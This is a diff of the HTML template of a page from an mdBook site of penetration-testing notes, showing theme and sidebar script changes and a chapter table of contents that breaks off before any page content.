@@ -1,5 +1,5 @@
 <!DOCTYPE HTML>
-<html lang="en" class="light sidebar-visible" dir="ltr">
+<html lang="en" class="light" dir="ltr">
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
@@ -7,7 +7,7 @@
 
 
         <!-- Custom HTML head -->
-
+        
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="theme-color" content="#ffffff">
@@ -22,42 +22,27 @@
         <link rel="stylesheet" href="../../../../fonts/fonts.css">
 
         <!-- Highlight.js Stylesheets -->
-        <link rel="stylesheet" id="highlight-css" href="../../../../highlight.css">
-        <link rel="stylesheet" id="tomorrow-night-css" href="../../../../tomorrow-night.css">
-        <link rel="stylesheet" id="ayu-highlight-css" href="../../../../ayu-highlight.css">
+        <link rel="stylesheet" href="../../../../highlight.css">
+        <link rel="stylesheet" href="../../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../../ayu-highlight.css">
 
         <!-- Custom theme stylesheets -->
         <link rel="stylesheet" href="../../../../theme/pagetoc.css">
 
-
-        <!-- Provide site root and default themes to javascript -->
-        <script>
-            const path_to_root = "../../../../";
-            const default_light_theme = "light";
-            const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "../../../../searchindex.js";
-        </script>
-        <!-- Start loading toc.js asap -->
-        <script src="../../../../toc.js"></script>
     </head>
-    <body>
-    <div id="mdbook-help-container">
-        <div id="mdbook-help-popup">
-            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
-            <div>
-                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
-                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
-                <p>Press <kbd>?</kbd> to show this help</p>
-                <p>Press <kbd>Esc</kbd> to hide this help</p>
-            </div>
-        </div>
-    </div>
+    <body class="sidebar-visible no-js">
     <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
         <!-- Work around some values being stored in localStorage wrapped in quotes -->
         <script>
             try {
-                let theme = localStorage.getItem('mdbook-theme');
-                let sidebar = localStorage.getItem('mdbook-sidebar');
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
 
                 if (theme.startsWith('"') && theme.endsWith('"')) {
                     localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
@@ -71,51 +56,70 @@
 
         <!-- Set the theme before any content is loaded, prevents flash -->
         <script>
-            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
-            let theme;
+            var theme;
             try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
             if (theme === null || theme === undefined) { theme = default_theme; }
-            const html = document.documentElement;
+            var html = document.querySelector('html');
             html.classList.remove('light')
             html.classList.add(theme);
-            html.classList.add("js");
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
         </script>
 
         <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
 
         <!-- Hide / unhide sidebar before it is displayed -->
         <script>
-            let sidebar = null;
-            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
             if (document.body.clientWidth >= 1080) {
                 try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                 sidebar = sidebar || 'visible';
             } else {
                 sidebar = 'hidden';
-                sidebar_toggle.checked = false;
             }
-            if (sidebar === 'visible') {
-                sidebar_toggle.checked = true;
-            } else {
-                html.classList.remove('sidebar-visible');
-            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
         </script>
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
-            <!-- populated by js -->
-            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
-            <noscript>
-                <iframe class="sidebar-iframe-outer" src="../../../../toc.html"></iframe>
-            </noscript>
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../../../introduction.html">Welcome!</a></li><li class="chapter-item expanded "><a href="../../../../attack/index.html"><strong aria-hidden="true">1.</strong> Attack</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/ai/index.html"><strong aria-hidden="true">1.1.</strong> AI</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/ai/ai_fundamentals.html"><strong aria-hidden="true">1.1.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/binary_exploitation/index.html"><strong aria-hidden="true">1.2.</strong> Binary Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/binary_exploitation/stack_based_buffer_overflows_linux_x86.html"><strong aria-hidden="true">1.2.1.</strong> Stack-Based Buffer Overflows Linux x86</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">1.3.</strong> Cloud</div></li><li class="chapter-item "><div><strong aria-hidden="true">1.4.</strong> Crypto</div></li><li class="chapter-item "><div><strong aria-hidden="true">1.5.</strong> GamePwn</div></li><li class="chapter-item "><a href="../../../../attack/hardware_ics/index.html"><strong aria-hidden="true">1.6.</strong> Hardware / ICS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/hardware_ics/hardware_ics_fundamentals.html"><strong aria-hidden="true">1.6.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/initial_access/index.html"><strong aria-hidden="true">1.7.</strong> Initial Access</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/index.html"><strong aria-hidden="true">1.7.1.</strong> Attacking Common Applications</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/app_discovery_enum.html"><strong aria-hidden="true">1.7.1.1.</strong> Application Discovery & Enum</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_cms.html"><strong aria-hidden="true">1.7.1.2.</strong> CMS</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_gateway_interfaces.html"><strong aria-hidden="true">1.7.1.3.</strong> Common Gateway Interfaces</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_management.html"><strong aria-hidden="true">1.7.1.4.</strong> Customer Service / Configuration Management</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_infra_network_tools.html"><strong aria-hidden="true">1.7.1.5.</strong> Infra & Network Tools</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_misc_apps.html"><strong aria-hidden="true">1.7.1.6.</strong> Misc Applications</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_other_apps.html"><strong aria-hidden="true">1.7.1.7.</strong> Other Notable Apps</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_servlet_containers.html"><strong aria-hidden="true">1.7.1.8.</strong> Servlet Containers / Software Dev</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_thick_client.html"><strong aria-hidden="true">1.7.1.9.</strong> Thick Client Applications</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/index.html"><strong aria-hidden="true">1.7.2.</strong> Attacking Common Services</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_common_services_fundamentals.html"><strong aria-hidden="true">1.7.2.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_dns.html"><strong aria-hidden="true">1.7.2.2.</strong> DNS</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_email_services.html"><strong aria-hidden="true">1.7.2.3.</strong> Email Services</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_ftp.html"><strong aria-hidden="true">1.7.2.4.</strong> FTP</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_rdp.html"><strong aria-hidden="true">1.7.2.5.</strong> RDP</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_smb.html"><strong aria-hidden="true">1.7.2.6.</strong> SMB</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_sql.html"><strong aria-hidden="true">1.7.2.7.</strong> SQL</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/initial_access/footprinting.html"><strong aria-hidden="true">1.7.3.</strong> Footprinting</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/index.html"><strong aria-hidden="true">1.7.4.</strong> Password Attacks</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/password_attacks_fundamentals.html"><strong aria-hidden="true">1.7.4.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/linux_password_attacks.html"><strong aria-hidden="true">1.7.4.2.</strong> Linux</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/network_password_attacks.html"><strong aria-hidden="true">1.7.4.3.</strong> Network</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/remote_password_attacks.html"><strong aria-hidden="true">1.7.4.4.</strong> Remote</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/windows_password_attacks.html"><strong aria-hidden="true">1.7.4.5.</strong> Windows</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/initial_access/shells_payloads.html"><strong aria-hidden="true">1.7.5.</strong> Shells & Payloads</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/linux/index.html"><strong aria-hidden="true">1.8.</strong> Linux</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/linux/linux_fundamentals.html"><strong aria-hidden="true">1.8.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/macos/index.html"><strong aria-hidden="true">1.9.</strong> MacOS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/macos/macos_fundamentals.html"><strong aria-hidden="true">1.9.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">1.10.</strong> Mobile</div></li><li class="chapter-item "><div><strong aria-hidden="true">1.11.</strong> OSINT</div></li><li class="chapter-item "><a href="../../../../attack/pivoting/index.html"><strong aria-hidden="true">1.12.</strong> Pivoting - old</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/pivoting/chisel.html"><strong aria-hidden="true">1.12.1.</strong> Chisel</a></li><li class="chapter-item "><a href="../../../../attack/pivoting/ligolo.html"><strong aria-hidden="true">1.12.2.</strong> Ligolo</a></li><li class="chapter-item "><a href="../../../../attack/pivoting/socat.html"><strong aria-hidden="true">1.12.3.</strong> Socat</a></li><li class="chapter-item "><a href="../../../../attack/pivoting/ssh_und_proxychains.html"><strong aria-hidden="true">1.12.4.</strong> SSH und Proxychains</a></li><li class="chapter-item "><a href="../../../../attack/pivoting/sshuttle.html"><strong aria-hidden="true">1.12.5.</strong> Sshuttle</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/index.html"><strong aria-hidden="true">1.13.</strong> Post-Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/post_exploitation/file_transfers.html"><strong aria-hidden="true">1.13.1.</strong> File Transfers</a></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/password_attacks/index.html"><strong aria-hidden="true">1.13.2.</strong> Password Attacks</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/post_exploitation/password_attacks/linux_password_attacks.html"><strong aria-hidden="true">1.13.2.1.</strong> Linux</a></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/password_attacks/network_password_attacks.html"><strong aria-hidden="true">1.13.2.2.</strong> Network</a></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/password_attacks/windows_password_attacks.html"><strong aria-hidden="true">1.13.2.3.</strong> Windows</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">1.13.3.</strong> Persistence</div></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/pivoting.html"><strong aria-hidden="true">1.13.4.</strong> Pivoting</a></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/privesc/index.html"><strong aria-hidden="true">1.13.5.</strong> PrivEsc</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/post_exploitation/privesc/linux_privesc.html"><strong aria-hidden="true">1.13.5.1.</strong> Linux PrivEsc</a></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/privesc/windows_privesc.html"><strong aria-hidden="true">1.13.5.2.</strong> Windows PrivEsc</a></li></ol></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">1.14.</strong> Reversing</div></li><li class="chapter-item "><a href="../../../../attack/tools/index.html"><strong aria-hidden="true">1.15.</strong> Tools</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/tools/metasploit.html"><strong aria-hidden="true">1.15.1.</strong> Metasploit</a></li><li class="chapter-item "><a href="../../../../attack/tools/nmap.html"><strong aria-hidden="true">1.15.2.</strong> nmap</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/vuln_scanning/index.html"><strong aria-hidden="true">1.16.</strong> Vuln Scanning</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/vuln_scanning/nessus.html"><strong aria-hidden="true">1.16.1.</strong> Nessus</a></li><li class="chapter-item "><a href="../../../../attack/vuln_scanning/openvas.html"><strong aria-hidden="true">1.16.2.</strong> OpenVAS</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../attack/web/index.html"><strong aria-hidden="true">1.17.</strong> Web</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/fundamentals/index.html"><strong aria-hidden="true">1.17.1.</strong> 0x00</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/fundamentals/fuzzing_fundamentals.html"><strong aria-hidden="true">1.17.1.1.</strong> Fuzzing</a></li><li class="chapter-item "><a href="../../../../attack/web/fundamentals/http_https_fundamentals.html"><strong aria-hidden="true">1.17.1.2.</strong> HTTP/HTTPs</a></li><li class="chapter-item "><a href="../../../../attack/web/fundamentals/web_proxy_fundamentals.html"><strong aria-hidden="true">1.17.1.3.</strong> Proxies</a></li><li class="chapter-item "><a href="../../../../attack/web/fundamentals/web_recon_fundamentals.html"><strong aria-hidden="true">1.17.1.4.</strong> Reconnaissance</a></li><li class="chapter-item "><a href="../../../../attack/web/fundamentals/web_applications_fundamentals.html"><strong aria-hidden="true">1.17.1.5.</strong> Web Applications</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../attack/web/web_attacks/index.html"><strong aria-hidden="true">1.17.2.</strong> Attacks</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_attacks/client_side/index.html"><strong aria-hidden="true">1.17.2.1.</strong> Client-side</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_attacks/client_side/xss.html"><strong aria-hidden="true">1.17.2.1.1.</strong> XSS</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/injection_attacks/index.html"><strong aria-hidden="true">1.17.2.2.</strong> Injections</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_attacks/injection_attacks/command_injections.html"><strong aria-hidden="true">1.17.2.2.1.</strong> Command Injections</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/injection_attacks/sqli.html"><strong aria-hidden="true">1.17.2.2.2.</strong> SQLi</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../attack/web/web_attacks/server_side/index.html"><strong aria-hidden="true">1.17.2.3.</strong> Server-side</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../attack/web/web_attacks/server_side/file_inclusion.html" class="active"><strong aria-hidden="true">1.17.2.3.1.</strong> File Inclusion</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/file_upload_attacks.html"><strong aria-hidden="true">1.17.2.3.2.</strong> File Upload Attack</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/http_verb_tampering.html"><strong aria-hidden="true">1.17.2.3.3.</strong> HTTP Verb Tampering</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/idor.html"><strong aria-hidden="true">1.17.2.3.4.</strong> IDOR</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/ssi.html"><strong aria-hidden="true">1.17.2.3.5.</strong> SSI</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/ssrf.html"><strong aria-hidden="true">1.17.2.3.6.</strong> SSRF</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/ssti.html"><strong aria-hidden="true">1.17.2.3.7.</strong> SSTI</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/xlst.html"><strong aria-hidden="true">1.17.2.3.8.</strong> XLST</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/xxe.html"><strong aria-hidden="true">1.17.2.3.9.</strong> XXE</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/web_service_api/index.html"><strong aria-hidden="true">1.17.2.4.</strong> Web Service & API</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_attacks/web_service_api/web_service_api.html"><strong aria-hidden="true">1.17.2.4.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/web_service_api/api_attacks.html"><strong aria-hidden="true">1.17.2.4.2.</strong> APIs</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/web_service_api/web_service_attacks.html"><strong aria-hidden="true">1.17.2.4.3.</strong> Web Service</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/authentication/index.html"><strong aria-hidden="true">1.17.3.</strong> Authentication</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/authentication/broken_authentication.html"><strong aria-hidden="true">1.17.3.1.</strong> Broken Authentication</a></li><li class="chapter-item "><a href="../../../../attack/web/authentication/login_brute_forcing.html"><strong aria-hidden="true">1.17.3.2.</strong> Login Brute Forcing</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/cms/index.html"><strong aria-hidden="true">1.17.4.</strong> CMS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/cms/cms.html"><strong aria-hidden="true">1.17.4.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/web/cms/wordpress.html"><strong aria-hidden="true">1.17.4.2.</strong> Wordpress</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/web_security_techniques/index.html"><strong aria-hidden="true">1.17.5.</strong> Web Security</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_security_techniques/javascript_deobfuscation.html"><strong aria-hidden="true">1.17.5.1.</strong> JavaScript (De-)Obfuscation</a></li><li class="chapter-item "><a href="../../../../attack/web/web_security_techniques/session_security.html"><strong aria-hidden="true">1.17.5.2.</strong> Session Security</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../../../attack/windows/index.html"><strong aria-hidden="true">1.18.</strong> Windows</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/windows/windows_fundamentals.html"><strong aria-hidden="true">1.18.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/index.html"><strong aria-hidden="true">1.18.2.</strong> Active Directory</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/windows/ad/intro_ad.html"><strong aria-hidden="true">1.18.2.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/index.html"><strong aria-hidden="true">1.18.2.2.</strong> Enumeration and (basic) Attacks</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_initial_enum.html"><strong aria-hidden="true">1.18.2.2.1.</strong> Initial Enumeration</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_sniffing_for_foothold.html"><strong aria-hidden="true">1.18.2.2.2.</strong> Foothold</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_user_hunting.html"><strong aria-hidden="true">1.18.2.2.3.</strong> User Hunting</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_internal_password_spraying.html"><strong aria-hidden="true">1.18.2.2.4.</strong> Internal Password Spraying</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_credentialed_enum_lotl.html"><strong aria-hidden="true">1.18.2.2.5.</strong> Credentialed Enum & LOTL</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_kerberoasting.html"><strong aria-hidden="true">1.18.2.2.6.</strong> Kerberoasting</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_acl_abuse.html"><strong aria-hidden="true">1.18.2.2.7.</strong> ACL</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_extras.html"><strong aria-hidden="true">1.18.2.2.8.</strong> Extras</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_domain_trust_attacks.html"><strong aria-hidden="true">1.18.2.2.9.</strong> Domain Trusts Attacks</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_cross_forest_trust_attacks.html"><strong aria-hidden="true">1.18.2.2.10.</strong> Cross-Forest Trust Attacks</a></li></ol></li></ol></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../../../../defend/index.html"><strong aria-hidden="true">2.</strong> Defend</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/defensive_considerations/index.html"><strong aria-hidden="true">2.1.</strong> Defensive Considerations, Mitigation, Hardening</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/defensive_considerations/ad_defensive_considerations.html"><strong aria-hidden="true">2.1.1.</strong> AD</a></li><li class="chapter-item "><a href="../../../../defend/defensive_considerations/common_application_hardening.html"><strong aria-hidden="true">2.1.2.</strong> Common Applications</a></li></ol></li><li class="chapter-item "><a href="../../../../defend/digital_forensics/index.html"><strong aria-hidden="true">2.2.</strong> Digital Forensics</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/digital_forensics/disk_forensics/index.html"><strong aria-hidden="true">2.2.1.</strong> Disk Forensics</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/digital_forensics/disk_forensics/windows_event_logs.html"><strong aria-hidden="true">2.2.1.1.</strong> Windows Event Logs</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">2.2.2.</strong> Memory Forensics</div></li><li class="chapter-item "><div><strong aria-hidden="true">2.2.3.</strong> Network Forensics</div></li></ol></li><li class="chapter-item "><a href="../../../../defend/incident_response/index.html"><strong aria-hidden="true">2.3.</strong> Incident Response</a></li><li class="chapter-item "><a href="../../../../defend/malware_analysis/index.html"><strong aria-hidden="true">2.4.</strong> Malware Analysis</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/malware_analysis/intro_malware_analysis.html"><strong aria-hidden="true">2.4.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><a href="../../../../defend/siem/index.html"><strong aria-hidden="true">2.5.</strong> SIEM</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/siem/siem_fundamentals.html"><strong aria-hidden="true">2.5.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">2.6.</strong> Threat Hunting</div></li></ol></li><li class="chapter-item expanded "><a href="../../../../general/index.html"><strong aria-hidden="true">3.</strong> General</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/assessments/index.html"><strong aria-hidden="true">3.1.</strong> Assessments</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/assessments/standards.html"><strong aria-hidden="true">3.1.1.</strong> Assessment Standards</a></li><li class="chapter-item "><a href="../../../../general/assessments/security_assessment.html"><strong aria-hidden="true">3.1.2.</strong> Security Assessment</a></li><li class="chapter-item "><a href="../../../../general/assessments/vulnerability_assessment.html"><strong aria-hidden="true">3.1.3.</strong> Vulnerability Assessment</a></li></ol></li><li class="chapter-item "><a href="../../../../general/dbms/index.html"><strong aria-hidden="true">3.2.</strong> DBMS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/dbms/dbms_fundamentals.html"><strong aria-hidden="true">3.2.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../general/dbms/mysql_fundamentals.html"><strong aria-hidden="true">3.2.2.</strong> MySQL</a></li><li class="chapter-item "><div><strong aria-hidden="true">3.2.3.</strong> Neo4J</div></li></ol></li><li class="chapter-item "><a href="../../../../general/elastic_stack/index.html"><strong aria-hidden="true">3.3.</strong> Elastic Stack</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/elastic_stack/building_great_search_experiences.html"><strong aria-hidden="true">3.3.1.</strong> Building Great Search Experiences</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/configuring_index_time_series_data.html"><strong aria-hidden="true">3.3.2.</strong> Configuring Elasticsearch Index for Time Series Data</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/index.html"><strong aria-hidden="true">3.3.3.</strong> Data Analysis with Kibana</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/02_search_your_data.html"><strong aria-hidden="true">3.3.3.1.</strong> Search Your Data</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/03_visualize_your_data.html"><strong aria-hidden="true">3.3.3.2.</strong> Visualize Your Data</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/04_additional_visualizations.html"><strong aria-hidden="true">3.3.3.3.</strong> Additional Visualizations</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/05_present_your_data.html"><strong aria-hidden="true">3.3.3.4.</strong> Present Your Data</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/06_analyze_your_data_with_ml.html"><strong aria-hidden="true">3.3.3.5.</strong> Analyze Your Data With Machine Learning</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/07_advanced_kibana.html"><strong aria-hidden="true">3.3.3.6.</strong> Advanced Kibana</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/08_alerting.html"><strong aria-hidden="true">3.3.3.7.</strong> Alerting</a></li></ol></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/index.html"><strong aria-hidden="true">3.3.4.</strong> Elasticsearch Engineer</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/01_intro_elasticsearch.html"><strong aria-hidden="true">3.3.4.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/02_data_modelling.html"><strong aria-hidden="true">3.3.4.2.</strong> Data Modelling</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/03_search.html"><strong aria-hidden="true">3.3.4.3.</strong> Search</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/04_aggregations.html"><strong aria-hidden="true">3.3.4.4.</strong> Aggregations</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/05_data_processing.html"><strong aria-hidden="true">3.3.4.5.</strong> Data Processing</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/06_distributed_datastore.html"><strong aria-hidden="true">3.3.4.6.</strong> Distributed Datastore</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/07_data_management.html"><strong aria-hidden="true">3.3.4.7.</strong> Data Management</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/08_cluster_management.html"><strong aria-hidden="true">3.3.4.8.</strong> Cluster Management</a></li></ol></li><li class="chapter-item "><a href="../../../../general/elastic_stack/esql_for_security_analysts.html"><strong aria-hidden="true">3.3.5.</strong> ES|QL for Security Analysts</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/kubernetes_basics.html"><strong 